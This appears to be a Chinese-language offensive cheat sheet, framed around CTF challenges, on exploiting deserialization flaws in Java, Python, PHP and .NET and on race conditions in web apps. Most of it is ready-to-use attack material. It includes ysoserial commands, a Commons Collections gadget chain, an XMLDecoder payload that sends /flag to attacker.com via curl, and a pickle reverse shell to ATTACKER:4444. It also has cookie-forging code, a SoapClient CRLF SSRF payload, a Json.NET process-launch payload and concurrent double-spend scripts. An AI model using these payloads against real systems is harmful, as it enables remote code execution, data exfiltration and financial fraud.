---

phase: webapp
vuln_class: [deserialization, race-condition, rce]
title: 反序列化与竞争条件
summary: 反序列化的判据是「不可信字节进了会构造对象的 API」。四种语言的 magic 字节不同，gadget 链思路也不同。竞争条件是「检查与使用之间有窗口」，靠并发放大。
---

# 反序列化与竞争条件

注入总入口见 [[web/漏洞分类/注入类/server-side.md|server-side.md]]；代码执行与上传见 [[web/漏洞分类/注入类/server-side-exec.md|server-side-exec.md]]；PHP 反序列化手法全集见 [[web/漏洞分类/反序列化/反序列化测试.md|反序列化测试]]。

## 0. 判据速查

| 看到的字节/特征 | 语言/格式 | 去哪节 |
|---|---|---|
| base64 解开是 `AC ED 00 05` / `rO0AB` | Java 二进制序列化 | §1 |
| `Content-Type: application/x-java-serialized-object` | Java | §1 |
| base64 解开是 `\x80\x04\x95` / `\x80\x05\x95` | Python pickle（协议 4/5） | §2 |
| `O:5:"名字":...` / `a:2:{...}` | PHP serialize | §3 |
| JSON 里有 `$type` | .NET Json.NET | §4 |
| XML 里有 `<object class=...>` | Java XMLDecoder | §5 |
| `!!python/object/apply` | PyYAML 不安全加载 | §2.5 |
| 有「检查后执行」的两步逻辑 | 竞争条件 | §6 |

**核心判据**：不可信字节进了**会构造对象**的 API。反序列化之所以危险，是因为「构造对象」会调用 `readObject` / `__reduce__` / `__wakeup` / `__destruct` / 属性 setter —— **这些方法里可能有任意代码**。

---

## 1. Java 二进制反序列化

**漏洞形态**：`ObjectInputStream.readObject()` 处理不可信输入。

**识别**：

- base64 解开后以 `AC ED 00 05`（hex）或 `rO0AB`（base64）开头
- `Content-Type: application/x-java-serialized-object`
- Cookie、POST body、JSF ViewState（base64）
- Burp 插件 Java Deserialization Scanner 自动标

**为什么能 RCE**：反序列化会调用 classpath 上各类的 `readObject()`。若存在「gadget 链」（一串类的 `readObject` → 方法调用最终导向任意执行），攻击者**不需要上传代码**就能执行。

```bash
# 生成 payload
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser

# 常用链（按顺序试）
# CommonsCollections1-7     Apache Commons Collections
# CommonsBeanutils1         Commons BeanUtils
# URLDNS                   不执行代码，只做 DNS 回调（盲测）
# JRMPClient               触发 JRMP 连接
# Spring1/Spring2          Spring Framework

# 盲测（不需要 RCE，只看 DNS）
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64

curl -X POST http://target/api \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.ser
```

**绕过类黑名单**：

- `ObjectInputStream` 子类拦了特定类 → 换别的链
- `ysoserial-modified` 和 `GadgetProbe` 枚举 classpath 上实际有哪些 gadget 类
- 走 JNDI：`ysoserial JRMPClient 'attacker:1099'` + `marshalsec`（见 [JNDI 注入测试](../JNDI注入/JNDI 注入测试.md)）
- **Java 17+**（模块系统限制）→ 找应用特有的 gadget，或转打 Jackson/Fastjson 的反序列化

### 1.1 TiedMapEntry + LazyMap 链（延迟触发）

标准 CommonsCollections 链在构造 payload 时就可能提前触发。用 `TiedMapEntry` + `LazyMap` 把触发延迟到反序列化时：

```java
// 构造 transformer 链（经典 Commons Collections）
Transformer[] chain = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"id"}),
};

Map inner = LazyMap.decorate(new HashMap(), new ChainedTransformer(chain));
TiedMapEntry entry = new TiedMapEntry(inner, "trigger");

// 关键：包进 HashMap 时不能让 LazyMap 提前解析
HashMap<Object, Object> outer = new HashMap<>();
outer.put("placeholder", "x");          // 先分配 table[]
Map.Entry[] table = (Map.Entry[]) Whitebox.getInternalState(outer, "table");
// 反射把 entry 直接写进 table，绕过 put 的 hashCode 调用
```

**判据**：payload 一构造就执行（本地测试发现命令已经跑了）→ 需要用 `TiedMapEntry`/`LazyMap` 延迟。这个坑在「本地能打、远程打不了」时最容易出现。

（题目例证：Trend Micro CTF 2018）

### 1.2 XMLDecoder

`XMLDecoder` 从 XML 自动实例化类并调方法，**不需要 gadget 链**：

```xml
<object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
    </array>
  </void>
</object>
```

**判据**：XMLDecoder 是文本型、免 gadget 的直达路径。看到 `java.beans.XMLDecoder` 就直接构造这个。

（题目例证：HackIM 2016）

---

## 2. Python pickle

**漏洞形态**：`pickle.loads()`、`pickle.load()`、`shelve`、`joblib.load()`、`torch.load()`。

**识别**：

- base64 解开是 `\x80\x04\x95`（协议 4）或 `\x80\x05\x95`（协议 5）
- Flask/Django session cookie 用了 pickle 序列化器（默认是 JSON）
- ML 模型文件（`.pkl`、`.npy`）、Redis 里存的对象

**为什么必 RCE**：`pickle.loads()` 会调对象的 `__reduce__()`，它可以直接返回 `(os.system, ('command',))`。**pickle 没有安全的反序列化方式**，只要输入不可信就必然可执行。

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

print(base64.b64encode(pickle.dumps(RCE())).decode())

# 多行 payload 用 exec
class ExecRCE:
    def __reduce__(self):
        return (exec, ('import socket,subprocess,os;s=socket.socket();'
                       's.connect(("ATTACKER",4444));'
                       'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
                       'subprocess.call(["/bin/sh","-i"])',))
```

### 2.1 链式执行：剥掉 STOP 操作码

`pickle.loads()` 一次调用里串多个操作：把第一个 payload 的 STOP 操作码（`\x2e`）剥掉，接上第二个 payload。pickle 虚拟机会顺着往下执行。

```python
import pickle, os

class Redirect:
    def __reduce__(self):
        return (os.dup2, (5, 1))       # 把 stdout 重定向到 socket fd 5

class Execute:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
```

**用途**：远程 pickle 反序列化但**命令输出不返回**时，先用 `dup2` 把 stdout/stderr 接到 socket，再执行命令 —— 输出直接出现在响应里。

**判据**：盲 pickle 且你能控制 socket fd（知道是第几个）时用这条。fd 编号要靠试或从代码推。

（题目例证：VolgaCTF 2013）

### 2.2 绕过受限 Unpickler

- `RestrictedUnpickler` 用模块白名单 → 从**允许的模块**里找可达的 gadget
- `builtins` 允许时：`(__builtins__.__import__, ('os',))` 拿模块，再链 `.system()`
- 只允许 `copyreg` 之类时，找它们的 `__reduce__` 间接可达路径

### 2.3 混淆包装层

备份/恢复端点把对象往返序列化，但用 `rot13(base64(pickle.dumps(obj)))` 之类混淆格式。**包装层不改变可利用性**，只要在发送前把逆变换组合上：

```python
import pickle, base64, codecs, subprocess

class P:
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh',),))

raw = pickle.dumps(P())
wrapped = codecs.encode(base64.b64encode(raw).decode(), 'rot13')
print(wrapped)
```

**怎么认出包装层**：本地把空 list 编码一次，和服务器返回的格式对比。任何**逐字节 1:1 映射**都是替换密码，直接可逆。常见层：ROT13、hex、zlib、XOR、base64 变体。

（题目例证：TAMUctf 2019 — VeggieTales）

### 2.4 Werkzeug SecureCookie（SECRET_KEY 泄露后）

`werkzeug.contrib.securecookie.SecureCookie` 用 **pickle** 序列化 session。一旦 Flask 的 `SECRET_KEY` 泄露（例如 SSRF 读 `/proc/self/environ`），任何 cookie 都能重新签名，`__reduce__` gadget 在反序列化时触发。

```python
import subprocess
from werkzeug.contrib.securecookie import SecureCookie

class Pwn:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))

cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
# Cookie: session=<cookie>，从响应里读 flag
```

**判据**：任何「pickle + HMAC 签名 cookie」的组合，离 RCE 只差一个 SECRET_KEY 泄露。Flask 默认的 `itsdangerous` 用 JSON，但老应用还在用 `SecureCookie` 或自定义签名器。

（题目例证：CSAW 2018 Finals — NekoCat）

### 2.5 PyYAML

`yaml.load()` 不带 `Loader=SafeLoader` 时有等价 RCE：

```yaml
!!python/object/apply:os.system ["cat /flag.txt"]
```

**判据**：`yaml.load(input)` 而不是 `yaml.safe_load(input)`。

### 2.6 NumPy

`numpy.load(allow_pickle=True)` 会触发 pickle。`.npy`/`.npz` 文件是入口。

---

## 3. PHP serialize

**漏洞形态**：`unserialize($_GET[...])` / `unserialize($_COOKIE[...])` / session handler。

**识别**：`O:5:"类名":字段数:{...}`（对象）、`a:2:{...}`（数组）、`s:5:"hello"`（字符串）。

### 3.1 长度字段被过滤器改坏

序列化**之后**的字符串过滤器把某个词替换成更长的词（如 `where` 5 字符 → `hacker` 6 字符），造成长度字段与实际内容不符。PHP 反序列化器按声明的长度读，读到边界之后的内容就被当成新的序列化字段解析。

```php
// 想注入的字段
$payload = '";}s:5:"photo";s:10:"config.php";}';
// 重复 "where" 让扩张量正好等于 strlen($payload)
$_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
```

**原理**：每替换一个 `where` 多出 1 字节，重复 N 次就多 N 字节。声明长度仍是原值，于是解析器把后面 N 字节算作下一个字段。

**判据**：序列化之后还有字符串替换/过滤。审计时找 `serialize()` 之后调 `str_replace`/`preg_replace` 的代码。

（题目例证：0CTF 2016）

### 3.2 SoapClient 的 `__call()` → SSRF

反序列化一个 `SoapClient`，当有**未定义方法**被调用时 `__call()` 触发 HTTP 请求。`uri` 参数不过滤 CRLF，可以走私完整请求：

```php
$p = array(
    'uri' => "http://127.0.0.1/\r\nContent-Length:0\r\n\r\nPOST /index.php?action=login HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID=XXX\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nusername=admin&password=nu1ladmin&code=XXX\r\n\r\nPOST /foo\r\n",
    'location' => 'http://127.0.0.1/'
);
$soap = new SoapClient(null, $p);
```

**触发链**：

```
unserialize(user_input) → $obj->anyMethod() → SoapClient::__call() → 发出 HTTP 请求
session_start() 自定义 handler → session 里是 SoapClient → 访问时 __call()
```

**判据**：任何反序列化 sink + 一次方法调用 = 完整 SSRF 原语。`location` 决定打哪，`uri` 里的 CRLF 决定发什么。

（题目例证：N1CTF 2018）

### 3.3 双 URL 编码绕黑名单

端点在 `unserialize` 前已经解了一次 URL 编码。黑名单用 `strpos` 查 `.php`/`.txt`/`.html`，但双编码的 `%252e` 在第一次解码后是字面 `%2e`，躲过检查；curl 再解一次才变成 `.`。

```php
// 序列化之后把 '.' 换成 '%252e'，然后修长度
// "file:///var/www/html/config.php"  31 字符
// → "file:///var/www/html/config%252ephp"  线上 35 字节，第一次解码后 33 字符
// 所以序列化串里写 s:33
print str_replace('.', '%252e', urlencode(serialize(new SHITS)));
```

**判据**：**解码次数不一致**。校验层解 1 次，执行层解 2 次 → 差值就是绕过空间。

（题目例证：FireShell CTF 2019）

---

## 4. .NET Json.NET `$type`

**漏洞形态**：`TypeNameHandling.All` 或 `TypeNameHandling.Objects`。

```csharp
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All    // 危险：会解析 $type
};
var obj = JsonConvert.DeserializeObject(userInput, settings);
```

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c calc.exe"
    }
  }
}
```

```bash
# 用 ysoserial.net 生成
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
# 常用 gadget：ObjectDataProvider、WindowsIdentity、ActivitySurrogateSelector
```

**识别**：.NET/ASP.NET 应用 + JSON 接口。若服务端**也**用 `TypeNameHandling` 序列化，响应里会出现 `$type`（这是最好的确认信号）。报错里有 Newtonsoft.Json 堆栈也是。

**判据**：`$type` 能实例化**已加载程序集里的任意类**。任何有危险构造函数、隐式转换或 setter 副作用的类都是攻击面。

**修法**：`TypeNameHandling.None`（默认）+ 自定义 `ISerializationBinder` 白名单。

（题目例证：DefCamp 2017）

---

## 5. 竞争条件（TOCTOU）

**漏洞形态**：服务端先检查条件（余额、注册唯一性、优惠券有效性），再执行动作，两步之间无锁。

**核心**：同时发 N 个相同请求。服务端为**所有**请求读到「修改前」的状态，然后依次应用所有变更 —— 每个请求都看到了原始状态。

```python
import asyncio, aiohttp

async def race(url, data, headers, n=20):
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(race('http://target/api/transfer',
    {'to': 'attacker', 'amount': 1000},
    {'Cookie': 'session=...'},
    n=50))
```

```bash
# Turbo Intruder（Burp）—— 精确时序最可靠
# 或 curl + GNU parallel
seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
```

### 5.1 常见目标

| 目标 | 逻辑 |
|---|---|
| **双花 / 余额绕过** | `if balance >= amount` → 50 个并发转账，都看到原始余额 |
| **优惠券重复使用** | 先校验后标记已用 → 标记前并发兑换 |
| **注册唯一性** | `if not user_exists(name)` → 并发注册同名，后者覆盖前者（可接管 admin） |
| **上传后用** | 上传 → 校验 → 移动，在校验与删除之间访问文件 |

### 5.2 源码特征

- 非原子的 read-then-write，没有锁或事务
- `SELECT ... UPDATE` 没有 `FOR UPDATE`，或隔离级别不是可串行化
- `if os.path.exists()` 然后 `open()`（经典 TOCTOU）
- Redis `GET` 然后 `SET`，没有 `WATCH`/`MULTI`

**判据**：**找「先判断、后修改」的两段代码**。并发数要足够高（≥20）才能稳定命中窗口；网络抖动会让部分请求落在窗口外。

---

## 6. 纪律

- **先认 magic 字节**。`AC ED 00 05` / `\x80\x04\x95` / `O:` / `$type` / `<object class=` —— 一眼定语言，比猜快得多。
- **Java 先用 URLDNS 盲测**。不需要 RCE，只看 DNS 回调就能确认反序列化点存在。确认了再上 gadget。
- **本地能打、远程打不了 = 构造期提前触发**。用 `TiedMapEntry` + `LazyMap` 延迟（§1.1）。
- **pickle 没有安全反序列化**。看到 `pickle.loads` 就假定 RCE，不用论证。
- **混淆层不改变可利用性**。ROT13/hex/zlib/XOR 只是组合逆变换，先用空对象往返对比识别格式。
- **PHP 的长度字段是攻击面**。序列化之后的任何字符串替换都会改坏长度，这是 PHP 特有的入口。
- **竞争条件要 ≥20 并发**。单个请求永远命中不了窗口，这是最常见的「测了但没成」原因。
- **报的是「执行了命令 / 拿到双倍余额」不是「存在反序列化点」**。
